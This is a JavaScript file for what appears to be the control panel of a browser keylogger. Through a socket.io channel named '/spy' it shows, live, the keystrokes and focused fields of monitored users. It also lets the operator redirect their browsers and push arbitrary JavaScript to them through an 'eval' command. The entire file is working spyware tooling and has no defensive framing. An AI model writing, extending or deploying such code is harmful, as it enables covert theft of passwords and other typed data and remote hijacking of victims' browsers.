var keylogger = document.getElementById('keylogger');

chat = {
    newLineInitialised: false,
    append: function (key) {
        if (this.newLineInitialised) {
            this.newLine();
            this.newLineInitialised = false;
        }

        switch (key) {
            case 'Backspace':
                break;
            case 'Enter':
                key = '</br>'
            default:
                var lastLine = document.querySelector('#keylogger li:last-child');
                lastLine.innerHTML += key;
                this.newLineInitialised = false;
        }
    },
    newLine: function (msg) {
        var li = document.createElement('li');
        if (msg) {
            li.innerHTML = msg;
        }
        keylogger.appendChild(li);

        this.newLineInitialised = true;
    }
};

var lastElement = '';
var newLine = false;
elementChange = function (newElement) {
    if (lastElement !== newElement) {
        var message = 'Changed to: <b>' + newElement + '</b>';
        chat.newLine(message);
        lastElement = newElement;
    }
};


const socket = io('/spy');
socket.on('type', function (key) {
    chat.append(key);
});
socket.on('focus', function (focus) {
    elementChange(focus);
});

const redirectInput = document.getElementById('redirectUri');
const redirectButton = document.getElementById('redirectButton');
redirectButton.onclick = () => {
    if (redirectInput.value !== '') {
        socket.emit('redirect', redirectInput.value)
        redirectInput.value = '';
    }
    return false;
}


const consoleInput = document.getElementById('console');
const evalButton = document.getElementById('evalButton');

evalButton.onclick = () => {
    if (console.value !== '') {
        socket.emit('eval', consoleInput.value);
        consoleInput.value = '';
    }
    return false;
};
